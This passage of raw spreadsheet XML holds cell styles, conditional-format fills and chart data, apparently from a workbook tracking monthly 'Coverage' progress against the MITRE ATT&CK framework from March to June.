    <xf numFmtId="0" fontId="1" fillId="0" borderId="4" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="9" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="9" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="9" fontId="5" fillId="0" borderId="1" xfId="0" applyNumberFormat="1" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="4" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="5" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="6" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="11" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="9" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="12" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="7" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="8" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="10" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="1" fillId="13" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="2" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="3" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="7" fillId="0" borderId="0" xfId="0" applyFont="1"/>
    <xf numFmtId="0" fontId="8" fillId="0" borderId="0" xfId="0" applyFont="1"/>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="0" xfId="0" applyFont="1"/>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="center" vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="5" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="1" xfId="0" applyBorder="1"/>
    <xf numFmtId="0" fontId="9" fillId="0" borderId="0" xfId="0" applyFont="1"/>
    <xf numFmtId="9" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1"/>
    <xf numFmtId="0" fontId="1" fillId="8" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="1" fillId="14" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="15" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="18" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="8" fillId="17" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="8" fillId="16" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="1" fillId="2" borderId="4" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="3" borderId="4" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="9" fontId="1" fillId="3" borderId="4" xfId="0" applyNumberFormat="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="9" fontId="1" fillId="0" borderId="4" xfId="0" applyNumberFormat="1" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="4" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="9" fontId="10" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyFont="1"/>
    <xf numFmtId="0" fontId="0" fillId="13" borderId="0" xfId="0" applyFill="1" applyAlignment="1">
      <alignment horizontal="left"/>
    </xf>
    <xf numFmtId="0" fontId="8" fillId="0" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment horizontal="left"/>
    </xf>
    <xf numFmtId="0" fontId="8" fillId="0" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="8" fillId="0" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment horizontal="left"/>
    </xf>
    <xf numFmtId="0" fontId="11" fillId="0" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyFill="1" applyAlignment="1">
      <alignment horizontal="left" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="0" xfId="1" applyFill="1" applyAlignment="1" applyProtection="1"/>
    <xf numFmtId="0" fontId="10" fillId="0" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="1" xfId="0" applyFill="1" applyBorder="1"/>
  </cellXfs>
  <cellStyles count="2">
    <cellStyle name="Hyperlink" xfId="1" builtinId="8"/>
    <cellStyle name="Normal" xfId="0" builtinId="0"/>
  </cellStyles>
  <dxfs count="180">
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFC6E0B4"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFFFF00"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor theme="0" tint="-4.9989318521683403E-2"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFFFF00"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor theme="0" tint="-4.9989318521683403E-2"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFFFF00"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor theme="0" tint="-4.9989318521683403E-2"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>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patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill>
          <bgColor rgb="FFD9D9D9"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFFFF00"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFFE699"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFDDEBF7"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFBDD7EE"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFC6E0B4"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill patternType="solid">
          <bgColor theme="0" tint="-4.9989318521683403E-2"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor rgb="FFFF0000"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFFF2CC"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFFE699"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFDDEBF7"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFBDD7EE"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFC6E0B4"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FF92D050"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <font>
        <strike/>
      </font>
      <fill>
        <patternFill patternType="solid">
          <bgColor theme="0" tint="-4.9989318521683403E-2"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <border diagonalUp="0" diagonalDown="0">
        <left/>
        <right style="thin">
          <color auto="1"/>
        </right>
        <top/>
        <bottom/>
        <vertical/>
        <horizontal/>
      </border>
    </dxf>
    <dxf>
      <alignment horizontal="center" vertical="center" textRotation="0" wrapText="0" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <border outline="0">
        <top style="thin">
          <color auto="1"/>
        </top>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alignment wrapText="0"/>
    </dxf>
    <dxf>
      <alignment wrapText="0"/>
    </dxf>
    <dxf>
      <alignment wrapText="0"/>
    </dxf>
    <dxf>
      <alignment wrapText="0"/>
    </dxf>
    <dxf>
      <numFmt numFmtId="13" formatCode="0%"/>
      <alignment horizontal="center" vertical="center" textRotation="0" wrapText="0" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <numFmt numFmtId="13" formatCode="0%"/>
      <alignment horizontal="center" vertical="center" textRotation="0" wrapText="0" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <numFmt numFmtId="13" formatCode="0%"/>
      <alignment horizontal="center" vertical="center" textRotation="0" wrapText="0" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <numFmt numFmtId="13" formatCode="0%"/>
      <alignment horizontal="center" vertical="center" textRotation="0" wrapText="0" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <numFmt numFmtId="13" formatCode="0%"/>
      <alignment horizontal="center" vertical="center" textRotation="0" wrapText="0" indent="0" justifyLastLine="0" shrinkToFit="0" readingOrder="0"/>
    </dxf>
    <dxf>
      <numFmt numFmtId="13" formatCode="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wrapText="0"/>
    </dxf>
    <dxf>
      <alignment wrapText="0"/>
    </dxf>
    <dxf>
      <alignment wrapText="0"/>
    </dxf>
    <dxf>
      <alignment wrapText="0"/>
    </dxf>
    <dxf>
      <alignment wrapText="0"/>
    </dxf>
    <dxf>
      <border outline="0">
        <top style="thin">
          <color auto="1"/>
        </top>
      </border>
    </dxf>
    <dxf>
      <alignment wrapText="0"/>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alignment wrapText="0"/>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fill>
        <patternFill patternType="none"/>
      </fill>
    </dxf>
    <dxf>
      <font>
        <b/>
      </font>
    </dxf>
  </dxfs>
  <tableStyles count="0" defaultTableStyle="TableStyleMedium9" defaultPivotStyle="PivotStyleLight16"/>
  <colors>
    <mruColors>
      <color rgb="FFF8D3C0"/>
      <color rgb="FFD5E9CD"/>
      <color rgb="FFB5E1F2"/>
      <color rgb="FF1DEFF2"/>
      <color rgb="FFFFF2CC"/>
      <color rgb="FFFFE699"/>
      <color rgb="FF2DC653"/>
      <color rgb="FF70E000"/>
      <color rgb="FF38B000"/>
      <color rgb="FF007F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MITRE ATT&amp;CK Framework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'Basic Progress'!$A$2</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>March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 Progress'!$P$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Coverage</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Basic Progress'!$P$2</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>0.24785714285714291</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000002-20C6-490A-AAC6-8141AF4B90BE}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="1"/>
          <c:order val="1"/>
          <c:tx>
            <c:strRef>
              <c:f>'Basic Progress'!$A$3</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>April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 Progress'!$P$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Coverage</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Basic Progress'!$P$3</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>0.5210246681787275</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000004-20C6-490A-AAC6-8141AF4B90BE}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="2"/>
          <c:order val="2"/>
          <c:tx>
            <c:strRef>
              <c:f>'Basic Progress'!$A$4</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>May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 Progress'!$P$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Coverage</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Basic Progress'!$P$4</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>0.57571428571428573</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000006-20C6-490A-AAC6-8141AF4B90BE}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="3"/>
          <c:order val="3"/>
          <c:tx>
            <c:strRef>
              <c:f>'Basic Progress'!$A$5</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>June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 Progress'!$P$1</c:f>
              <c:strCache>
